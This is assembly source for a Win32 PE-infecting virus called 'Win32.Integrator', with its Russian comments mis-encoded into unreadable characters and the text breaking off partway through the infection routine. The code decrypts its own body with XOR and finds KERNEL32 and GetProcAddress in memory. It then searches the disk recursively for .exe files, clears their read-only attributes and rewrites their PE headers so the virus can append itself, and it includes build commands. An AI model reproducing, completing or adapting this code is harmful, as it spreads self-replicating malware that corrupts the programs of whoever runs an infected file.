   ;
   ;                            <<Win32.Integrator>>
   ;============================================================================
   ; ‚¥àá¨ï 1.1 (*à®¤®«¦¥¨¥ «¨¨¨ Win9x.Integrator 1.3)
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   *¥à¥§¨¤¥âë© PE EXE ¨ä¥ªâ®à.
   ; - “áâ  ¢«¨¢ ¥â á¢®© SEH;
   ; - *à®¨§¢®¤¨â ¯®¨áª ImageBase KERNEL32.DLL ¢ ¯ ¬ïâ¨;
   ;   + ‚¨¤®¨§¬¥¥ ¨ ¬®¤¨ä¨æ¨à®¢  ¯®¨áª.
   ; - *¥ªãàá¨¢® ®¡å®¤¨â â¥ªãé¨© ¤¨áª, ¯à¨¬¥à® ç¥à¥§ âà¨ á¥ªã¤ë à ¡®âë
   ;   á®åà ï¥â â¥ªãé¨© ¯ãâì ¢ WIN.INI ¨ ¯¥à¥¤ ¥â ã¯à ¢«¥¨¥ ®á¨â¥«î, ¯à¨
   ;   á«¥¤ãîé¥¬ § ¯ãáª¥ § à ¦¥®£® ä ©«  áç¨âë¢ ¥â á®åà ¥ë© ¯ãâì ¨
   ;   ¯à®¨§¢®¤¨â ¤ «ì¥©é¨© ¯®¨áª  ç¨ ï á á®åà ¥®£® ¯ãâ¨;
   ; - ‘¨¬ ¥â ReadOnly  âà¨¡ãâë ä ©« ;
   ; - ‡ à ¦ ¥â ¢ ¯®á«¥¤îî á¥ªæ¨î, áâ ¢¨â ¥© R/W/E/I  âà¨¡ãâë;
   ; - *¥ § à ¦ ¥â: - ä ©«ë á ®¢¥à«¥ï¬¨;
   ;                - ä ©«ë, ¢ ª®â®àëå ä¨§¨ç¥áª¨© ¨«¨ ¢¨àâã «ìë© à §¬¥àë ª®¤ 
   ;                  à ¢ë ã«î;
   ;                - ä ©«ë, ¢ ª®â®àëå ä¨§¨ç¥áª¨© à §¬¥à ª®¤  ¡®«ìè¥
   ;                  ¢¨àâã «ì®£®;
   ;                - ä ©«ë á  âà¨¡ãâ®¬ DLL;
   ;                + ä ©«ë á SubSystem = 1 (Native)
   ;                + ä ©«ë, ã ª®â®àëå â®çª  ¢å®¤  ¥ ¢ ¯¥à¢®© á¥ªæ¨¨
   ; - ˜¨äà®¢  ¯® XOR á ¯« ¢ îé¨¬ ª«îç®¬;
   ; - Œ®¤¨ä¨æ¨à®¢  ¯à®æ¥áá £¥¥à æ¨¨ ®¢®£® ª«îç  ¤«ï á®¢¬¥áâ¨¬®áâ¨ á WinNT.
   ;
   ; 10.2.01                                           (C) Gobleen Warrior//SMF
   ;============================================================================
   ; tasm32 /ml /m integrator.asm
   ; tlink32 /Tpe /ap /c /x integrator.obj,,,import32.lib
   ;============================================================================
   ; People can fly... Everything can happen...

   DOEXE                   equ 0 ; 1 - ¨é¥â *.gwi ä ©«ë, 0 - *.exe
   PROCDIR                 equ 0 ; 1 - â¥ªãé¨© ª â «®£, 0 - à¥ªãàá¨ï

                           .386p
                           .model flat
   ; Ž¡êï¢«ï¥¬ ¥®¡å®¤¨¬ë¥ ¤«ï à ¡®âë ŸŠŽ*› ®á¨â¥«ï ä-æ¨¨ API
   extrn                   ExitProcess:proc
   extrn                   MessageBoxA:proc

                           .data
   ;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
   ;º *®è¥« ¢¨àãáë© ª®¤                                                       º
   ;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
   virstart:               pushad
   ; *®«ãç¨¬ ¤¥«ìâã
                           call near ptr delta
   delta:                  mov ebp, [esp]
                           sub ebp, offset delta
                           add esp, 4
   ; * áè¨äàã¥¬ â¥«®
                           lea esi, [ebp+cryptstart]
                           mov edi, esi
                           mov ecx, cryptlen
   uncryptor:              mov al, byte ptr [esi]
                           lodsb
                           db 034h ; XOR AL
   key:                    db 0    ; ç¨á«®
                           stosb
                           loop uncryptor
   cryptstart:
   ; ‘®åà ¨¬ áâ àãî â®çªã ¢å®¤ 
                           mov eax, dword ptr [ebp+original_ip]
                           mov dword ptr [ebp+temp_ip], eax
   ; “áâ ®¢¨¬ ®¢ë© SEH
                           call set_seh
   ; ‘î¤  ¬ë ¡ã¤¥¬ ¢®§¢à é âìáï ¢ á«ãç ¥ ®è¨¡ª¨. ‚®ááâ ®¢¨¬ áâ àë© áâíª (®
   ;  å®¤¨âáï ¢ ESP+8)
                           mov esp, [esp+8]
   ret_to_file:            pop dword ptr fs:[0]
                           pop eax
   ; *¥à¥¤ ¥¬ ã¯à ¢«¥¨¥ ®à¨£¨ «ì®¬ã ä ©«ã
                           popad
   original_ip             equ $+1
                           jmp hoststart
   ; “áâ ®¢¨¬ â ª¨ ®¢ë© SEH
   ; *à¨ § £àã§ª¥ ä ©«  fs:[0] ª ¦¨â   áâàãªâãàã, á®¤¥à¦ éãî  ¤à¥á SEH
   set_seh:                push dword ptr fs:[0]
                           mov dword ptr fs:[0], esp
                           call locate_kernel
                           jmp short ret_to_file

   locate_kernel           proc near
   ; * å®¤¨â ¨ ¯à®¢¥àï¥â   ¨áâ¨®áâì image_base Kernel32 ¢ ¯ ¬ïâ¨ :))))
                           mov eax, offset delta
                           add eax, ebp ; €¤à¥á  ç «  ¢¨àãá®£® ª®¤ 
                           xor ax, ax ; Ž¡ã«¨¬ ¬« ¤è¥¥ á«®¢®
   is_it_exe:              cmp word ptr [eax], 'ZM' ; EAX = imagebase  ç «  PE
                           je found_mz
   not_kernel:             sub eax, 1000h ; ¬¨ãá áâà ¨æ 
                           jmp short is_it_exe
   found_mz:               mov ebx, [eax+3ch]
                           add ebx, eax
                           cmp word ptr [ebx], 'EP' ;   ¢áïª¨© á«ãç ©
                           jne not_kernel
                           mov ebx, [ebx+080h] ; = RVA 1®£® ª â «®£  ¨¬¯®àâ 
                           add ebx, eax ; + ImageBase = VA ®®£®
   next_imp_catalog:       mov ecx, dword ptr [ebx+0ch] ; = RVA ASCII ¨¬¥¨
                                                        ; íªá¯®àâ¥à  äãªæ¨¨
                           add ecx, eax ; + ImageBase = VA ®®£®
                           mov ecx, [ecx]
                           and ecx, 05fdfdfffh ; *à¨¢¥¤¥¬ ª ¢¥àå¥¬ã à¥£¨áâàã
                           cmp ecx, 'NREK' ; Kernel32.dll?
                           je kernel_directory
                           add ebx, 014h
                           jmp short next_imp_catalog
   kernel_directory:       mov ebx, [ebx+010h] ; RVA ’ ¡«¨æë  ¤à¥á®¢ ¨¬¯®àâ 
                           add ebx, eax ; VA ®®©
                           mov eax, [ebx] ; VA ¥ª®¥© äãªæ¨¨, ãª §ë¢ ¥â
                                          ; ªã¤ -â® ¢ãâàì KERNEL32.DLL.
                           xor ax, ax     ; Ž¡ã«¨¬ ¬« ¤èãî ç áâì  ¤à¥á , ® 
                                          ; ¥ ã¦  - ª¥à¥« § £àã¦ ¥âáï á
                                          ;  ¤à¥á , ªà â®£® 1 á¥£¬¥âã
                                          ; (10000h ¡ ©â).
   test_kernel:            cmp word ptr [eax], 'ZM'
                           je kernel_founded
                           sub eax, 10000h ; Œ¨ãá á¥£¬¥â
                           jmp short test_kernel
   kernel_founded:         mov ebx, [eax+3ch] ; RVA PE § £®«®¢ª 
                           add ebx, eax ; VA ®®£® (EAX = ImageBase ª¥à¥« )
                           call locate_getprocadress
                           mov eax, dword ptr [ebp+temp_ip]
                           mov dword ptr [ebp+original_ip], eax
                           retn
   endp

   locate_getprocadress    proc near
   ; Ž¯à¥¤¥«ï¥â  ¤à¥á GetProcAdress API
                           mov ecx, dword ptr  [ebx+ 078h] ; RVA â ¡«¨æë
                                                           ; íªá¯®àâ®¢
                           add ecx, eax ; VA â ¡«¨æë íªá¯®àâ®¢
                           xor edi, edi ; Ž¡ã«¨¬ áç¥âç¨ª ¨¬¥
                           dec edi ; ˜®¡ ¯¥à¢ë© à § ¡ë« ®«ì
   search4:                inc edi ; “¢¥«¨ç¨¬ áç¥âç¨ª
                           cmp dword ptr [ecx+14h], edi ; ‘à ¢¨¬ áç¥âç¨ª
                           ; ¯à®¢¥à¥ëå ¨¬¥ á ¨å ®¡é¨¬ ª®«¨ç¥áâ¢®¬ ¢  «¨ç¨¨
                           jb no_getprocadress ; …á«¨ ¡®«ìè¥ -   ¢ëå®¤
                           mov ebx, [ecx+020h] ; RVA â ¡«¨æë ãª § â¥«¥©  
                                               ; ¨¬¥  API
                           add ebx, eax ; VA  ¤à¥á â ¡«¨æë ®®©
                           mov ebx, [ebx+4*edi] ; RVA API ®¬¥à EDI
                           add ebx, eax ; VA ®®© API
   ; ‘à ¢¨¬ ®ç¥à¥¤®¥ ¨¬ï á GetProcAdress
                           mov edx, [ebx]
                           xor edx, [ebx+4]
                           cmp edx, 'PteG' xor 'Acor'
                           jne search4
   ; ‘®¢¯ «®. Œë  è«¨ ã¦ãî  ¬ API
   ; EDI = ¨¤¥ªá ®®© API ¢ â ¡«¨æ¥ ¨¬¥ ¨ ¢ â ¡«¨æ¥ ®à¤¨ «®¢
   ; *®«ãç¨¬  ¤à¥á ®à¤¨ «  ¤ ®© äãªæ¨¨. „«ï íâ®£® ã¬®¦¨¬ ¨¤¥ªá   2,
   ; ¯à¨¡ ¢¨¬ RVA â ¡«¨æë ®à¤¨ «®¢ ¨ imagebase Kernel32.
   ; ¨«¨:
   ; EDI*2+RVA_Table_ordins+ImageBase = Ordinal
   ; *®á«¥ íâ®£® ã¬®¦¨¢ ®à¤¨ «   4 ¨ ¯à¨¡ ¢¨¢ RVA â ¡«¨æë  ¤à¥á®¢ API ¬ë
   ; ¯®«ãç¨¬ RVA  ¤à¥á  API. *à¨¡ ¢¨¬ Kernel32 ImageBase ¨ ¯®«ãç¨¬ VA API.
   ; ¨«¨:
   ; Ordinal*4+RVA_AdressTable+ImageBase = RVA_ProcAdress
   ; RVA_ProcAdress+ImageBase = VA API GertProcAdress
                           shl edi, 1 ; ¨¤¥ªá API * 2
                           add edi, [ecx+024h] ; + RVA_Table_ordins
                           add edi, eax ; + Kernel32 ImageBase = Ordinal
                           movzx edx, word ptr [edi] ; EDX = Ordinal
                           shl edx, 2 ; Ordinal*4
                           add edx, [ecx+01ch] ; + RVA AdressTable
                           mov edx, [edx+eax] ; + Kernel32 ImageBase = RVA API
                           add edx, eax ; + Kernel32 ImageBase = VA API
   ; *®«ãç¨«¨  ¤à¥á ¤ ®© API. ‘®åà ¨¬ ¥£®.
                           mov dword ptr [ebp+ourGetProcAdress], edx
                           call locate_all_apis
   no_getprocadress:       retn
   endp

   locate_all_apis         proc near
   ; ‡ ¯®«ï¥â â ¡«¨æã  ¤à¥á®¢ ¥®¡å®¤¨¬ëå  ¬ API
   ; ‚ë§®¢ GetProcAdress:
   ;               push offset <¨¬ï äãªæ¨¨>
   ;               push imagebase
   ;               call GetProcAdress
                           lea esi, [ebp+getFindFirstFileA]
                           lea edi, [ebp+ourFindFirstFileA]
                           push eax ; Kernel32 ImageBase
                           pop ebx
   search4apis:            push esi
                           push ebx ; Kernel32 ImageBase
                           call [ebp+ourGetProcAdress]
                           test eax, eax
                           jz no_apis
                           stosd
   set_new_api_name:       inc esi
                           cmp byte ptr [esi], 0
                           jne set_new_api_name
                           inc esi
                           cmp byte ptr [esi], '*' ; *â® ¨¤¥â áà §ã § 
                                                   ; ¯®á«¥¤¨¬ ¨¬¥¥¬ API
                           jne search4apis
   ; ’¥¯¥àì ã  á ¥áâì ¢á¥ ¥®¡å®¤¨¬ë¥ API.
                           call prepare_file_search
   no_apis:                retn
   endp

   prepare_file_search     proc near
   ; ‘®åà ¨¬ â¥ªãéãî ¤¨à¥ªâ®à¨î.
   ; ‚ë§®¢ GetCurrentDirectoryA:
   ;               push offset <¡ãää¥à ¤«ï åà ¥¨ï ¯®«ãç¥®£® ¯ãâ¨>
   ;               push <à §¬¥à ®®£® ¡ãää¥à >
   ;               call GetCurrentDirectoryA
                           lea eax, [ebp+current_dir]
                           push eax
                           push 260
                           call [ebp+ourGetCurrentDirectoryA]
   ; *¥à¥©¤¥¬ ¢ ª®à¥¢ãî ¤¨à¥ªâ®à¨î.
   ; ‚ë§®¢ SetCurrentDirectoryA:
   ;               push offset <¨¬ï ¤¨à¥ªâ®à¨¨>
   ;               call SetCurrentDirectoryA
                           lea eax, [ebp+root_dir]
                           push eax
                           call [ebp+ourSetCurrentDirectoryA]
                           mov byte ptr [ebp+get_string_flag], 0
                           mov byte ptr [ebp+start_fuck_flag], 0
                           call process_dir
   ; ‚®ááâ ®¢¨¬ ¯¥à¢¨çãî ¤¨à¥ªâ®à¨î.
                           lea eax, [ebp+current_dir]
                           push eax
                           call [ebp+ourSetCurrentDirectoryA]
                           retn
   endp

   process_dir             proc near
                           cmp byte ptr [ebp+get_string_flag], 0
                           jne find_first
   ; *®«ãç¨âì áâà®ªã, á®åà ¥ãî ¢ WIN.INI
   ; ‚ë§®¢ GetProfileString:
   ;               push <à §¬¥à ¡ãää¥à  ¤«ï ¢®§¢à é ¥¬®© áâà®ª¨>
   ;               push offset <¡ãä¥à ¤«ï ¢®§¢à é ¥¬®© áâà®ª¨>
   ;               push offset <áâà®ª , ¢®§¢à é ¥¬ ï ¯®-ã¬®«ç ¨î
   ;                           (¥á«¨ ¨áª®¬®© áâà®ª¨ ¥ ®¡ àã¦¥®)
   ;               push offset <¨¬ï ª«îç  ¢ win.ini-ä ©«¥>
   ;               push offset <¨¬ï á¥ªæ¨¨ ¢ win.ini-ä ©«¥>
   ;               call GetProfileStringA
   ;               EAX = „«¨  ¢®§¢à é ¥¬®© áâà®ª¨
                           push 260
                           lea eax, [ebp+saved_string]
                           push eax
                           lea eax, [ebp+default_string]
                           push eax
                           lea eax, [ebp+ini_key]
                           push eax
                           lea eax, [ebp+ini_section]
                           push eax
                           call [ebp+ourGetProfileStringA]
                           mov byte ptr [ebp+get_string_flag], 1
                           test eax, eax
                           jnz catch_the_string
   set_fuck_flag:          mov byte ptr [ebp+start_fuck_flag], 1
                           call start_timer
                           jmp short find_first
   catch_the_string:
   ; ‘à ¢¨¬ ¨¬¥  ¤¨áª®¢ ¨§ á®åà ¥®© áâà®ª¨ ¨ ¨§ ª â «®£  § ¯ãáª 
                           mov ax, word ptr [ebp+current_dir]
                           mov bx, word ptr [ebp+saved_string]
                           cmp ax, bx
                           jne set_fuck_flag
   ; *®¤£®â®¢¨¬ á®åà ¥ãî áâà®ªã ª à ¡®â¥ - § ¬¥¨¬ ¢á¥ "\"   0
                           lea esi, [saved_string+3] ; *à®¯ãáâ¨¬ ¨¬ï ¤¨áª 
                           mov edi, esi
                           mov dword ptr [ebp+start_ini_string], esi
   another_sign:           lodsb
                           cmp al, '\'
                           jne not_slash
                           mov al, 0
                           jmp short finish_it
   not_slash:              or al, al
                           jz find_first
   finish_it:              stosb
                           jmp short another_sign
   find_first:             mov dword ptr [ebp+end_ini_string], esi
   ; *®¨é¥¬ ¢ ¤ ®© ¤¨à¥ *.*
   ; ‚ë§®¢ FindFirstFileA:
   ;               push offset <FIND áâàãªâãà >
   ;               push offset <¬ áª  ¯®¨áª >
   ;               call FindFirstFileA
                           lea eax, [ebp+findstruc]
                           push eax
                           lea eax, [ebp+maska]
                           push eax
                           call [ebp+ourFindFirstFileA]
                           cmp eax, -1
                           je go_out
                           mov dword ptr [ebp+search_handler], eax
   compare_or_not:         cmp byte ptr [ebp+start_fuck_flag], 0
                           jne start_fuck
   ; ‘à ¢¨âì  ©¤¥ë© í«¥¬¥â á í«¥¬¥â®¬ áâà®ª¨
   ; ‚ë§®¢ lstrcmpi:
   ;               push offset <áâà®ª  1>
   ;               push offset <áâà®ª  2>
   ;               call lstrcmpi
   ;               EAX = 0 ¥á«¨ áâà®ª¨ à ¢ë
                           mov eax, [ebp+start_ini_string]
                           push eax
                           lea eax, [ebp+ff_fullname]
                           push eax
                           call [ebp+ourlstrcmpi]
                           test eax, eax
   IF PROCDIR EQ 0
                           jnz find_next
   ENDIF

   ; *®¬¥áâ¨âì ¢ start_ini_string  ¤à¥á á«¥¤ãîé¥£® í«¥¬¥â 
                           mov eax, dword ptr [ebp+start_ini_string]
   not_last:               inc eax
                           cmp byte ptr [eax], 0
                           jne not_last
                           inc eax
                           mov dword ptr [ebp+start_ini_string], eax
   ; Ž¡à ¡®â âì  ©¤¥ë© í«¥¬¥â
   start_fuck:             test byte ptr [ebp+ff_attr], 16 ; „¨à¥ªâ®à¨ï?
                           jnz dir
                           call do_file
                           jmp test_time
   dir:                    cmp byte ptr [ebp+ff_fullname], '.' ; *à®¯ãáª âì
                                                               ; "." ¨ ".."
   IF PROCDIR EQ 1
                           jmp short test_time
   ELSE
                           je find_next
   ENDIF
                           push dword ptr [ebp+search_handler]
                           lea eax, [ebp+ff_fullname]
                           push eax
                           call [ebp+ourSetCurrentDirectoryA]
                           call process_dir
                           pop dword ptr [ebp+search_handler]
   ; *®à  á¬ë¢ âìáï?
   test_time:              cmp byte ptr [ebp+get_out_flag], 0
                           jne go_out
   ; …á«¨ ¬ë ¥é¥ ¥ ¢ª«îç «¨ â ©¬¥à - ¥ ¯à®¢¥àïâì ¥£® § ç¥¨¥
                           cmp byte ptr [ebp+start_fuck_flag], 0
                           je check_end_of_ini
   ; *à®¢¥à¨âì â¥ªãé¥¥ § ç¥¨¥ â ©¬¥à 
   ; ‚ë§®¢ GetTickCount:
   ;               call GetTickCount
   ;               EAX = ¢à¥¬ï ¢ â¨ª å á  ç «  â¥ªãé¥© á¥á¨¨ WINDOWS
                           call [ebp+ourGetTickCount]
                           sub eax, dword ptr [ebp+counter]
                           cmp eax, 3000 ; 3 á¥ªã¤ë
                           jb find_next
                           mov byte ptr [ebp+get_out_flag], 1
   ; ‘®åà ¨¬ â¥ªãé¨© ¯ãâì ¢ WIN.INI
   ; *®«ãç¨¬ â¥ªãé¨© ¯ãâì
                           lea eax, [ebp+saved_string]
                           push eax
                           push 260
                           call [ebp+ourGetCurrentDirectoryA]
   ; „®¯¨è¥¬ âã¤  "\" ¨ ¨¬ï ¯®á«¥¤¥£® ®¡ê¥ªâ 
                           lea esi, [ebp+ff_fullname]
                           lea edi, [ebp+saved_string]
                           cmp eax, 3
                           jne all_ok
                           dec edi
   all_ok:                 add edi, eax
                           mov al, byte ptr '\'
                           stosb
   next_letter:            lodsb
                           cmp al, 0
                           je endets
                           stosb
                           jmp short next_letter
   ; ‚ë§®¢ WriteProfileString:
   ;               push offset <áâà®ª  ¤«ï § ¯¨á¨>
   ;               push offset <¨¬ï ª«îç  ¢ win.ini>
   ;               push offset <¨¬ï á¥ªæ¨¨ ¢ win.ini>
   ;               call WriteProfileStringA
   endets:                 stosb
                           lea eax, [ebp+saved_string]
                           push eax
                           lea eax, [ebp+ini_key]
                           push eax
                           lea eax, [ebp+ini_section]
                           push eax
                           call [ebp+ourWriteProfileStringA]
                           jmp short go_out
   ; …á«¨ â¥ªãé¨© í«¥¬¥â á®åà ¥®© áâà®ª¨ - ¯®á«¥¤¨©, ¢ëáâ ¢¨âì ä« £ à ¡®âë
   check_end_of_ini:       mov eax, dword ptr [ebp+start_ini_string]
                           cmp dword ptr [ebp+end_ini_string], eax
                           jne find_next
                           mov byte ptr [ebp+start_fuck_flag], 1
                           call start_timer
   find_next:
   ; ‚ë§®¢ FindNextFileA:
   ;               push offset <FIND áâàãªâãà >
   ;               push <å¥¤« ¯®¨áª >
   ;               call FindNextFileA
                           lea eax, [ebp+findstruc]
                           push eax
                           push dword ptr [ebp+search_handler]
                           call [ebp+ourFindNextFileA]
                           cmp eax, 1
                           je compare_or_not
                           cmp byte ptr [ebp+start_fuck_flag], 0
                           je set_fuck_flag
   ; ‚ë§®¢ FindClose:
   ;               push <å¥¤« ¯®¨áª >
   ;               call FindClose
   go_out:                 push dword ptr [ebp+search_handler]
                           call [ebp+ourFindClose]
                           lea eax, [ebp+dotdot]
                           push eax
                           call [ebp+ourSetCurrentDirectoryA]
                           retn
   endp

   start_timer             proc near
                           call [ebp+ourGetTickCount]
                           mov dword ptr [ebp+counter], eax
                           retn
   endp

   do_file                 proc near
   ; Ž¡à ¡ âë¢ ¥â ä ©«
                           xor eax, eax
                           lea edi, [ebp+ff_fullname]
                           repne scasb
                           mov eax, [edi-5]
                           or eax, 20202000h ; *à¨¢®¤¨â ª ¨¦¥¬ã à¥£¨áâàã
   IF DOEXE EQ 1
                           cmp dword ptr eax, 'iwg.' ; ä ©« - gwi?
   ELSE
                           cmp dword ptr eax, 'exe.' ; ä ©« - ¥å¥?
   ENDIF
                           jne it_not_exe
   ; “áâ ®¢¨âì ®à¬ «ìë¥  âà¨¡ãâë
                           push 020h
                           lea eax, [ebp+ff_fullname]
                           push eax
                           call [ebp+ourSetFileAttributesA]
   ; Žâªàëâì ä ©« ¤«ï çâ¥¨ï/§ ¯¨á¨
   ; ‚ë§®¢ CreateFileA:
   ;               push 0
   ;               push < âà¨¡ãâë ä ©« > ; 80h - ®à¬ «ìë¥
   ;               push <à¥ ªæ¨ï   ®âáãáâ¢¨¥ ä ©« >
   ;                                    ; 2=CREATE_ALWAYS, 3=OPEN_EXISTING
   ;               push 0
   ;               push <â¨¯  ª ª®© ¤®áâã¯> ; 1 = FILE_SHARE_READ
   ;                                        ; 2 = FILE_SHARE_WRITE
   ;               push <à¥¦¨¬ ¤®áâã¯ > ; 80000000h = GENERIC_READ
   ;                                    ; 40000000h = GENERIC_WRITE
   ;               push offset <¨¬ï ä ©« >
   ;               call CreateFileA
                           push 0
                           push 80h ; *®à¬ «ìë©  âà¨¡ãâ
                           push 3 ; ®âªàë¢ âì â®«ìª® ¨¬¥îé¨¥áï ä ©«ë
                           push 0
                           push 1+2 ; çâ¥¨¥/§ ¯¨áì
                           push 80000000h+40000000h ; çâ¥¨¥ /§ ¯¨áì
                           lea eax, [ebp+ff_fullname]
                           push eax
                           call [ebp+ourCreateFileA]

                           cmp eax, -1 ; …áâì ®è¨¡ª¨?
                           je it_not_exe

                           mov ebx, eax ; ‘®åà ¨¬ handle ä ©« 
   ; ” ©« ®âªàëâ ¨ ¢á¥ ¨èâïª.

   ; ‘ç¨â ¥¬ 40h - MZ § £®«®¢®ª
                           mov esi, 40h
                           lea edi, [ebp+mz_header]
                           call read_file
   ; *à®¢¥àª    MZ
                           cmp word ptr [ebp+mz_signat],'ZM'
                           jne close_file
   ; “áâ ®¢¨¬ ãª § â¥«ì   PE § £®«®¢®ª
                           mov esi, dword ptr [ebp+mz_pe_pointer]
                           call set_pointer
   ; ‘ç¨â ¥¬ PE § £®«®¢®ª
                           mov esi, 0f8h
                           lea edi, [ebp+pe_header]
                           call read_file
   ; *à®¢¥à¨¬   PE
                           cmp word ptr [ebp+pe_header], 'EP'
                           jne close_file
   ; *à®¢¥à¨¬   DLL
                           test word ptr [ebp+pe_flags], 2000h
                           jne close_file
   ; *à®¢¥à¨¬   Device Driver (¥ âà®¦ì £®¢®, ¢®ïâì ¥ ¡ã¤¥â)
                           cmp word ptr [ebp+pe_subsys], 1
                           je close_file
   ; *à®¢¥à¨¬   § à ¦¥®áâì
                           cmp word ptr [ebp+pe_user_minor], 'WG'
                           je close_file
   ; *®«ãç¨¬ ¤«¨ã *… § £®«®¢ª 
                           movzx eax, word ptr [ebp+pe_nt_hdr_size]
                           add eax, 18h
   ; *®«ãç¨¬ á¬¥é¥¨¥ ’ ¡«¨æë Ž¡ê¥ªâ®¢ ¢ ä ©«¥
                           add eax, dword ptr [ebp+mz_pe_pointer]
   ; “áâ ®¢¨¬ ãª § â¥«ì    ç «® § £®«®¢ª  ¯¥à¢®© á¥ªæ¨¨
                           push eax
                           pop esi
                           call set_pointer
   ; ‘ç¨â ¥¬ § £®«®¢®ª ¢ ¡ãää¥à sec_header
                           mov esi, 28h
                           lea edi, [ebp+sec_header]
                           call read_file
   ; *®«ãç¨¬  ¤à¥á  ç «  ¯¥à¢®© á¥ªæ¨¨
                           mov esi, dword ptr [ebp+sec_rva]
   ; *à¨¡ ¢¨¬ Virtual Size
                           add esi, dword ptr [ebp+sec_virtual_size]
   ; ‘à ¢¨¬  ¤à¥á ª®æ  ¯¥à¢®© á¥ªæ¨¨ á â®çª®© ¢å®¤  (®¡   ¤à¥á  - RVA)
   ; …á«¨ â®çª  ¢å®¤  ¡®«ìè¥  ¤à¥á  ª®æ  ¯¥à¢®© á¥ªæ¨¨ (â®çª  ¢å®¤  ¥ ¢
   ; ¯¥à¢®© á¥ªæ¨¨) ä ©« ¥ âà®£ ¥¬, ¬ «® «¨...
                           cmp esi, dword ptr [ebp+pe_entry_point_rva]
                           jb close_file
   ; *®«ãç¨¬  ¤à¥á § £®«®¢ª  ¯®á«¥¤¥© á¥ªæ¨¨
   ; —¨á«® á¥ªæ¨© ãª § ® ¢ PE+06h. ‘¥ªæ¨¨ ã¬¥àãîâáï  ç¨ ï á 1. ‡ £®«®¢®ª
   ; ª ¦¤®© á¥ªæ¨¨ § ¨¬ ¥â 28h.
                           push eax ; ‘®åà ¨¬ ¢ áâ¥ª¥ á¬¥é¥¨¥    ç «®
                                    ; ’ ¡«¨æë Ž¡ê¥ªâ®¢ ¢ ä ©«¥
                           movzx eax, word ptr [ebp+pe_num_of_objects]
                           dec eax ; *®á«¥¤ïï á¥ªæ¨ï
                           mov edx, 28h
                           mul edx
                           mov esi, eax
                           pop eax
                           add esi, eax ; ESI = á¬¥é¥¨¥ ¢ ä ©«¥   § £®«®¢®ª
                                        ;¯®á«¥¤¥© á¥ªæ¨¨
   ; “áâ ®¢¨¬ ãª § â¥«ì    ç «® ®®© á¥ªæ¨¨
                           mov dword ptr [ebp+last_sec], esi
                           call set_pointer
   ; ‘ç¨â ¥¬ § £®«®¢®ª ¢ ¡ãää¥à sec_header
                           mov esi, 28h
                           lea edi, [ebp+sec_header]
                           call read_file
   ; ‚ëà ¢ï¥¬ ä¨§¨ç¥ªáãî ¨ ¢¨àâã «ìãî ¤«¨ë ¯®á«¥¤¥© á¥ªæ¨¨ ¯®
   ; á®®â¢¥âáâ¢ãîé¨¬ § ç¥¨ï¬ FileAlign (PE+3ch) ¨ ObjectAlign (PE+38h)
   ; „«¨ë ®ë¥ åà ïâìáï ¢ SectionHeader+10h (PhysicalSize) ¨ SectionHeader+
   ; 08h (VIrtualSize) á®®â¢¥âáâ¢¥®. • à ªâ¥à¨§ãîâ ®¨ à §¬¥à á¥ªæ¨¨   ¤¨áª¥
   ; (ä¨§¨ç¥áª¨© à §¬¥à) ¨ ¢ ¯ ¬ïâ¨ (¢¨àâã «ìë©)
                           mov eax, [ebp+pe_file_align]
                           dec eax
                           add [ebp+sec_physical_size], eax
                           not eax
                           and [ebp+sec_physical_size], eax
   ; ‚¨àâã «ìë©:
                           mov eax, [ebp+pe_object_align]
                           dec eax
                           add [ebp+sec_virtual_size], eax
                           not eax
                           and [ebp+sec_virtual_size], eax
   ; *à®¢¥àª    ®¢¥à«¥©:
   ; …á«¨
   ; (* áç¥âë© ä¨§. à §¬¥à ä ©«  - *¥ «ìë© à §¬¥à ®®£® ä ©« ) > File Align
   ; => Ž¢¥à«¥©.
                           mov eax, [ebp+sec_physical_size]
                                              ; ”¨§¨ç¥áª¨© à §¬¥à ¯®á«. á¥ªæ¨¨
                           add eax, [ebp+sec_phys_offset]
                                              ; ‘¬¥é¥¨¥  ç «  ®®© á¥ªæ¨¨
                                              ; ®â®á¨â¥«ì®  ç «  …•… (¢
                                              ; áã¬¬¥ ¤ îâ à §¬¥à ä ©« )
                           mov dword ptr [ebp+our_place], eax ; *à¨£®¤¨âáï
                           sub eax, [ebp+ff_file_size_low] ; ‚ëçâ¥¬ ¨§
                                              ; à áç¥â®£® à §¬¥à  ä ©«  ¥£®
                                              ; à¥ «ìë© à §¬¥à
   positive:               neg eax            ; *®«ãç¨¬ à¥§ã«ìâ â ¯® ¬®¤ã«î
                           jl positive
                           cmp [ebp+pe_file_align], eax ; ˆ áà ¢¨¬ ¥£® á
                                              ; ¢ëà ¢¨¢ ¨¥¬ ¢ ä ©«¥
                           jl close_file      ; …á«¨ ®áâ â®ª ®â ¢ëç¨â ¨ï
                                              ; ¡®«ìè¥ File Align - ®¢¥à«¥©.

   ; ’ ª¦¥ ã¦® á«¥¤¨âì, è®¡ ®¡¥ ¤«¨ë ¥ ¡ë«¨ ã«¥¢ë¬¨ ¨ ä¨§¨ç¥áª ï ¥ ¡ë« 
   ; ¡®«ìè¥ ¢¨àâã «ì®©
                           mov eax, [ebp+sec_physical_size] ; ”¨§¨ç¥áª ï
                           mov ecx, [ebp+sec_virtual_size] ; ‚¨àâã «ì ï
                           cmp ecx, eax
                           jb close_file
                           or eax, ecx
                           jz close_file
   ; ‘®åà ¨¬ áâ àãî â®çªã ¢å®¤ 
                           mov eax, [ebp+sec_rva]
                                              ; RVA ¯®á«¥¤¥© á¥ªæ¨¨ ¢ ¯ ¬ïâ¨
                           add eax, [ebp+sec_physical_size] ; ”¨§¨ç¥áª¨© à §¬¥à
                                                        ; ¯®á«¥¤¥© á¥ªæ¨¨
                           add eax, original_ip + 4 - virstart
                                              ; 4 ¯®â®¬ã ª ª JMP
                           ; áª ç¥â ®â®á¨â¥«ì® á«¥¤ãîé¥© ¯®á«¥ á¥¡ï (¨
